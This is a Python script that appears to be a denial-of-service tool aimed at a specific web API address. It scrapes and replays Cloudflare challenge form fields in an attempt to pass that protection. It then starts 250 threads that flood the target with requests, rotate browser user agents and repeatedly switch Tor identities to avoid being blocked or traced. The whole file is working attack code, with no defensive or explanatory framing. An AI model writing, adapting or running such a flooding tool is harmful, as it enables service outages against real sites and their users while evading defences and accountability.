import threading
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from stem import Signal
from stem.control import Controller
import random
import time

TARGET_URL = "http://api.deline.web.id/random/ba"
NUM_THREADS = 250
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

SESSION = requests.Session()

def renew_connection():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password="password anda")
            controller.signal(Signal.NEWNYM)
    except:
        pass

def bypass_cloudflare(url):
    try:
        response = SESSION.get(url, headers={'User-Agent': random.choice(USER_AGENTS)})
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', {'id': 'challenge-form'})
        
        if form:
            data = {field['name']: field.get('value', '') for field in form.find_all('input', {'name': True})}
            data['md'] = soup.find('input', {'name': 'md'})['value']
            data['s'] = soup.find('input', {'name': 's'})['value']
            data['jschl_vc'] = soup.find('input', {'name': 'jschl_vc'})['value']
            data['pass'] = soup.find('input', {'name': 'pass'})['value']
            challenge_url = urljoin(url, form['action'])
            time.sleep(5)
            response = SESSION.post(challenge_url, data=data, headers={'User-Agent': random.choice(USER_AGENTS)}, cookies=SESSION.cookies)
            response.raise_for_status()
            return True
    except:
        return False

def attack(url):
    while True:
        try:
            response = SESSION.get(url, headers={'User-Agent': random.choice(USER_AGENTS)})
            response.raise_for_status()
        except:
            pass
        
        if random.randint(1, 5) == 1:
            renew_connection()
        
        time.sleep(random.uniform(0.5, 1.5))

if __name__ == "__main__":
    if bypass_cloudflare(TARGET_URL):
        threads = []
        for _ in range(NUM_THREADS):
            thread = threading.Thread(target=attack, args=(TARGET_URL,))
            threads.append(thread)
            thread.daemon = True
            thread.start()
        
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
    else:
        pass
